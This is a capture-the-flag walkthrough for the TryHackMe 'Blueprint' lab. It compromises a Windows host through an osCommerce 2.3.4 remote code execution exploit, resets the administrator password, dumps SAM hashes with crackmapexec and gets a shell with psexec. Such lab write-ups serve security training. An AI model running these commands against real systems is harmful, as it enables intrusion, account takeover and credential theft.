---
description: https://tryhackme.com/room/blueprint
---

# Blueprint

## Nmap

```
sudo nmap 10.10.153.99 -sV -sS      

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Starting out we check port 8080 and find that a web server is running. The root page presents us with an index page where we see the commerce system oscommerce 2.3.4 is installed.

![](<../../../.gitbook/assets/image (94).png>)

A simple preliminary check with `searchsploit` shows multiple vulnerabilities with this version.

```
searchsploit oscommerce 2.3.4 -w
```

![](<../../../.gitbook/assets/image (71) (1).png>)

Searching for Remote Code Execution exploits on GitHub shows a PoC from the user nobodyatall648.

GitHub: [https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution](https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution)

Which has the following definition for the exploit:

_"Exploiting the install.php finish process by injecting php payload into the db\_database parameter & read the system command output from configure.php"_.

Using the example provided on GitHub we clone the repo and run with the following syntax:

```
python3 exploit.py http://<IP>/oscommerce-2.3.4/catalog/
```

![](<../../../.gitbook/assets/image (90).png>)

After gaining a SYSTEM level shell on the target system we now aim to gain a proper reverse shell. As well as dump the hashes from the target system.

With SYSTEM access we change the local administrator password.

```
net user administrator Password123
```

Then use `crackmapexec` to dump the NTLM hashes from the SAM file.

```bash
crackmapexec smb '10.10.153.99' -u 'Administrator' -p 'Password123' --local-auth --sam
```

![](<../../../.gitbook/assets/image (998).png>)

After dumping hashes from SAM we then use `psexec.py` to gain shell access to the target system.

```
psexec.py ./administrator:'Password123'@'10.10.153.99'
```

![](<../../../.gitbook/assets/image (74) (2).png>)
